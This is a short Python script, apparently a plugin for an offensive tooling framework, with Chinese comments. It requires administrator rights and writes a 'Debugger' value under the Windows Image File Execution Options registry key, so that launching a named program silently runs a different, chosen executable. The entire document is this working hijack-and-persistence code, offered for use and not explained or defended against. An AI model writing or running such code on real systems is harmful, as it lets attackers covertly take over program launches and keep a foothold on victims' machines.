import ctypes
import winreg


def register_startup_intercept(intercept_target, launch_path):
    try:
        if not intercept_target:
            print('[-] Missing intercepted target executable name')
            return

        if not launch_path:
            print('[-] Missing program path to launch')
            return

        if not ctypes.windll.shell32.IsUserAnAdmin():
            print('[-] Administrator privileges are required')
            return

        reg_path = (
            r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{}'
            .format(intercept_target)
        )

        winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, 'Debugger', 0, winreg.REG_SZ, launch_path)
        winreg.CloseKey(key)

        print('[+] Startup intercept registered successfully')
        print('[+] Intercepted target: {}'.format(intercept_target))
        print('[+] Actual launched program: {}'.format(launch_path))

    except Exception as error:
        print('[-] Failed to register startup intercept: {}'.format(error))


# intercept_target：被拦截启动的程序名
intercept_target = kwargs.get('intercept_target', '')

# launch_path：真正被执行的程序路径
launch_path = kwargs.get('launch_path', '')

register_startup_intercept(intercept_target, launch_path)